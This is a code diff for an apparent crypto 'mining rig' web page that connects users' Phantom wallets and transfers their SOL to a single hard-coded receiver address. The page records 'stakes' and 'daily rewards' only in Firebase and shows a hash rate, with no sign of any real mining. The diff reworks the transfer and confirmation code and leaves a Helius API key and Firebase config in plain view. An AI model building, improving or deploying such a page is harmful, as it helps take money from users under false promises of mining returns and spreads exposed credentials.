@@ -748,18 +748,16 @@
             </div>
         </div>
     </div>
-<script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-<script>
-window.Buffer = window.Buffer || window.buffer?.Buffer;
-</script>
 
-    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+    <!-- Solana Web3 and Buffer -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
 
-    <!-- Firebase + Phantom + Solana -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
-        import { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
+    <script>
+        // Initialize Buffer globally
+        window.Buffer = window.Buffer || window.buffer?.Buffer;
 
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCck4gA4cLcJfir9nJAigdZrVC8r91gciE",
             authDomain: "nova-e6655.firebaseapp.com",
@@ -769,20 +767,17 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
             messagingSenderId: "111451913127",
             appId: "1:111451913127:web:8cb6c4f1715daf0ff69482"
         };
-        
-        const fbApp = initializeApp(firebaseConfig);
-        const db = getFirestore(fbApp);
 
-        const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
-        
-        // FIXED: Correct Helius RPC URL format
-        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
-        
+        // Global variables
         let phantom = null;
         let walletAddress = null;
         let userDocRef = null;
         let miningInterval = null;
         let feedItems = [];
+        let db = null;
+
+        const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
+        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
 
         // UI Elements
         const connectBtn = document.getElementById('connectWalletBtn');
@@ -811,6 +806,22 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
         const quickStake1 = document.getElementById('quickStake1');
         const quickStake5 = document.getElementById('quickStake5');
         const quickStake10 = document.getElementById('quickStake10');
+
+        // Initialize Firebase
+        async function initFirebase() {
+            try {
+                const { initializeApp } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js');
+                const { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
+                
+                const fbApp = initializeApp(firebaseConfig);
+                db = getFirestore(fbApp);
+                
+                return { doc, setDoc, getDoc, updateDoc, serverTimestamp };
+            } catch (error) {
+                console.error('Firebase initialization error:', error);
+                return null;
+            }
+        }
 
         // Helper Functions
         function showModal(title, detail) {
@@ -843,8 +854,6 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
                 info: 'fa-circle info',
                 warning: 'fa-exclamation-triangle warning'
             };
-            
-            const icon = iconMap[type] || iconMap.info;
             
             feedItems.unshift({ message, type, time: Date.now() });
             if (feedItems.length > 8) feedItems.pop();
@@ -906,9 +915,11 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
             hashRateSpan.innerHTML = `⚡ ${hashRate.toLocaleString()} H/s`;
         }
 
-        // FIREBASE FUNCTIONS - READ FIRST then CREATE if not exists
+        // Firebase Functions
         async function loadUserData(address) {
-            if (!address) return null;
+            if (!address || !db) return null;
+            
+            const { doc, getDoc, setDoc, serverTimestamp } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
             
             const docId = address;
             userDocRef = doc(db, 'stakes', docId);
@@ -917,12 +928,10 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
                 const snap = await getDoc(userDocRef);
                 
                 if (snap.exists()) {
-                    // Document exists - just return the data
                     console.log('Found existing user data');
                     addToFeed('📊 loaded existing mining data', 'info');
                     return snap.data();
                 } else {
-                    // Document doesn't exist - create new
                     console.log('No existing data, creating new user');
                     const now = Date.now();
                     const newData = {
@@ -943,9 +952,10 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
             }
         }
 
-        // Calculate and apply daily rewards
         async function calculateDailyRewards(currentData) {
-            if (!currentData) return null;
+            if (!currentData || !userDocRef || !db) return null;
+            
+            const { updateDoc } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
             
             const now = Date.now();
             const lastUpdate = currentData.lastDailyUpdate || now;
@@ -974,9 +984,10 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
             return currentData;
         }
 
-        // Refresh UI with latest data
         async function refreshUserStats() {
-            if (!userDocRef || !walletAddress) return;
+            if (!userDocRef || !walletAddress || !db) return;
+            
+            const { getDoc } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
             
             const snap = await getDoc(userDocRef);
             if (!snap.exists()) return;
@@ -995,9 +1006,10 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
             updateMiningStats(total);
         }
 
-        // Add stake and update Firestore
-        async function addStakeToFirestore(amountSol) {
-            if (!userDocRef || !walletAddress) return;
+        async function addStakeToFirestore(amountSol, txid) {
+            if (!userDocRef || !walletAddress || !db) return;
+            
+            const { getDoc, updateDoc } = await import('https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js');
             
             const snap = await getDoc(userDocRef);
             if (!snap.exists()) return;
@@ -1007,11 +1019,126 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
             
             await updateDoc(userDocRef, {
                 totalStaked: newTotal,
-                lastDailyUpdate: Date.now()
+                lastDailyUpdate: Date.now(),
+                lastTransaction: txid
             });
             
             await refreshUserStats();
             addToFeed(`📦 +${amountSol} SOL added to mining rig`, 'success');
+        }
+
+        // FIXED: Send stake transaction with proper confirmation
+        async function sendStakeTransaction(amountSol) {
+            if (!phantom || !walletAddress) {
+                alert("Connect Phantom first");
+                return false;
+            }
+
+            try {
+                const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
+                
+                // Get the latest blockhash
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                
+                // Create transfer transaction
+                const transaction = new solanaWeb3.Transaction({
+                    feePayer: phantom.publicKey,
+                    recentBlockhash: blockhash,
+                }).add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: phantom.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_ADDRESS),
+                        lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL
+                    })
+                );
+
+                // Show modal that wallet approval is needed
+                showModal(
+                    "⛏️ APPROVE IN WALLET", 
+                    `Please approve the transaction in your Phantom wallet to add ${amountSol} SOL to your mining rig.`
+                );
+
+                // Sign and send transaction
+                const signed = await phantom.signTransaction(transaction);
+                
+                // Update modal to show sending
+                modalMessage.innerText = "📡 SENDING TRANSACTION";
+                modalDetail.innerText = "Transaction signed, submitting to network...";
+                
+                // Send the raw transaction
+                const signature = await connection.sendRawTransaction(signed.serialize(), {
+                    skipPreflight: false,
+                    preflightCommitment: 'confirmed'
+                });
+                
+                // Update modal to show confirmation
+                modalMessage.innerText = "⏳ CONFIRMING TRANSACTION";
+                modalDetail.innerText = `Signature: ${signature.slice(0, 8)}...${signature.slice(-8)}\nWaiting for confirmation...`;
+                
+                // Confirm transaction
+                const confirmation = await connection.confirmTransaction({
+                    signature,
+                    blockhash,
+                    lastValidBlockHeight
+                }, 'confirmed');
+                
+                if (confirmation.value.err) {
+                    throw new Error("Transaction failed to confirm");
+                }
+                
+                // Success! Update modal and Firestore
+                modalMessage.innerText = "✅ MINING ACTIVE!";
+                modalDetail.innerText = `Transaction confirmed!\nSignature: ${signature.slice(0, 8)}...${signature.slice(-8)}\nAmount: ${amountSol} SOL`;
+                
+                // Update Firestore
+                await addStakeToFirestore(amountSol, signature);
+                
+                addToFeed(`⛏️ mining started with ${amountSol} SOL`, 'mining');
+                
+                return true;
+                
+            } catch (err) {
+                console.error('Transaction error:', err);
+                
+                // Check if user rejected
+                if (err.message?.includes('rejected') || err.code === 4001) {
+                    modalMessage.innerText = "❌ TRANSACTION REJECTED";
+                    modalDetail.innerText = "You rejected the transaction in your wallet.";
+                } else {
+                    modalMessage.innerText = "❌ MINING FAILED";
+                    modalDetail.innerText = err.message || 'Transaction failed';
+                }
+                
+                addToFeed('⚠️ mining transaction failed', 'warning');
+                return false;
+            }
+        }
+
+        // Send stake wrapper
+        async function sendStake(amount = null) {
+            if (!walletAddress || !phantom) {
+                alert("Connect your mining rig first");
+                return;
+            }
+
+            const stakeAmount = amount || parseFloat(stakeAmountInput.value);
+            if (isNaN(stakeAmount) || stakeAmount < 0.01) {
+                alert("Minimum stake is 0.01 SOL");
+                return;
+            }
+
+            // Ensure wallet is connected
+            if (!phantom.publicKey) {
+                try {
+                    await phantom.connect();
+                } catch (err) {
+                    alert("Failed to connect wallet");
+                    return;
+                }
+            }
+
+            // Send transaction
+            await sendStakeTransaction(stakeAmount);
         }
 
         // Connect Phantom
@@ -1041,6 +1168,9 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
                 const resp = await phantom.connect();
                 walletAddress = resp.publicKey.toString();
                 
+                // Initialize Firebase first
+                await initFirebase();
+                
                 // Load existing data or create new
                 const userData = await loadUserData(walletAddress);
                 
@@ -1066,113 +1196,6 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
                 console.error('Connection error:', err);
                 alert('Failed to connect: ' + err.message);
                 connectBtn.innerHTML = '<i class="fab fa-phantom"></i><span class="btn-text">CONNECT PHANTOM</span>';
-            }
-        }
-       async function sendStakeTransaction(amountSol) {
-    if (!phantom || !walletAddress) {
-        alert("Connect Phantom first");
-        return;
-    }
-
-    try {
-        const connection = new solanaWeb3.Connection(HELIUS_RPC);
-
-        const fromPubkey = phantom.publicKey;
-        const toPubkey = new solanaWeb3.PublicKey(RECEIVER_ADDRESS);
-
-        const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey,
-                toPubkey,
-                lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL
-            })
-        );
-
-        transaction.feePayer = fromPubkey;
-
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-
-        // 🚀 Phantom popup will appear — NO modal needed
-        const signed = await phantom.signTransaction(transaction);
-
-        const sig = await connection.sendRawTransaction(signed.serialize());
-
-        await connection.confirmTransaction(sig);
-
-        addToFeed(`✅ Transaction confirmed: ${sig.slice(0,8)}...`, 'success');
-
-    } catch (err) {
-        console.error(err);
-        addToFeed(`❌ Transaction failed`, 'warning');
-    }
-}
-
-        // Send stake transaction
-        async function sendStake(amount = null) {
-            if (!walletAddress || !phantom) {
-                alert("Connect your mining rig first");
-                return;
-            }
-
-            const stakeAmount = amount || parseFloat(stakeAmountInput.value);
-            if (isNaN(stakeAmount) || stakeAmount < 0.01) {
-                alert("Minimum stake is 0.01 SOL");
-                return;
-            }
-
-            showModal("⛏️ MINING TRANSACTION", `Adding ${stakeAmount} SOL to mining rig...\nPlease approve in Phantom`);
-
-            try {
-                if (!phantom.publicKey) {
-                    await phantom.connect();
-                }
-
-                // FIXED: Using the correct Helius RPC URL
-                const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
-                
-                // Add timeout and retry logic
-                let blockhash;
-                try {
-                    const result = await connection.getLatestBlockhash();
-                    blockhash = result.blockhash;
-                } catch (blockhashError) {
-                    console.error('Blockhash error:', blockhashError);
-                    // Try public RPC as fallback
-                    const publicConnection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-                    const result = await publicConnection.getLatestBlockhash();
-                    blockhash = result.blockhash;
-                }
-
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: phantom.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_ADDRESS),
-                        lamports: stakeAmount * solanaWeb3.LAMPORTS_PER_SOL
-                    })
-                );
-                
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = phantom.publicKey;
-
-                const signed = await phantom.signTransaction(transaction);
-                const txid = await connection.sendRawTransaction(signed.serialize());
-                
-                modalMessage.innerText = "✅ MINING ACTIVE!";
-                modalDetail.innerText = `Transaction: ${txid.slice(0,8)}...${txid.slice(-8)}\nAmount: ${stakeAmount} SOL`;
-                
-                await addStakeToFirestore(stakeAmount);
-                
-                // Confirm transaction
-                await connection.confirmTransaction(txid, 'confirmed');
-                
-                addToFeed(`⛏️ mining started with ${stakeAmount} SOL`, 'mining');
-                
-            } catch (err) {
-                console.error('Transaction error:', err);
-                modalMessage.innerText = "❌ mining failed";
-                modalDetail.innerText = err.message || 'Transaction rejected';
-                addToFeed('⚠️ mining transaction failed', 'warning');
             }
         }
 
@@ -1216,6 +1239,9 @@ window.Buffer = window.Buffer || window.buffer?.Buffer;
             phantom = getPhantom();
             if (phantom?.isConnected && phantom.publicKey) {
                 walletAddress = phantom.publicKey.toString();
+                
+                // Initialize Firebase
+                await initFirebase();
                 
                 // Load existing data or create new
                 const userData = await loadUserData(walletAddress);
